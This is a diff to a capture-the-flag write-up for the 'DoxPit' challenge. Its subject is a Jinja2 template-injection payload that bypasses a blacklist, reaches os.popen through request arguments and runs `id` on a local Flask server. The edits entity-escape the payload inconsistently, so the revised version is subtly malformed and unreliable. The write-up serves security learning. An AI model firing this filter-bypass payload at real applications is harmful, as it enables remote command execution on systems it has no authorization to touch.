@@ -21,9 +21,9 @@ The first step in tackling the DoxPit challenge was to download the provided cha
 
 The Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of  `render_template_string`
 
-# app.py  
+  
 ```python
-
+# app.py
 @web.route("/home", methods=["GET", "POST"])  
 @auth_middleware  
 def feed():  
@@ -222,7 +222,7 @@ The idea was to use another input parameter to read the payload, this approach i
 And that’s the payload I came with
 
 ```jinja2
-{%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=`
+&#123;%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%&#125;{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=`
 ```
 
 To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters
@@ -244,8 +244,9 @@ I navigated through the  `request`  attributes to access Python’s  `globals`  
 
 And Successfully executed the  `id`  command, confirming root access
 
-```jinja2
-http://0.0.0.0:3000/home?token=<>&directory={%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
+```http
+http://0.0.0.0:3000/home?token=<>&directory=%&#123;with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%&#125;%&#123;print(output)%&#125;%&#123;
+endwith%&#125;&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
 ```
 
 
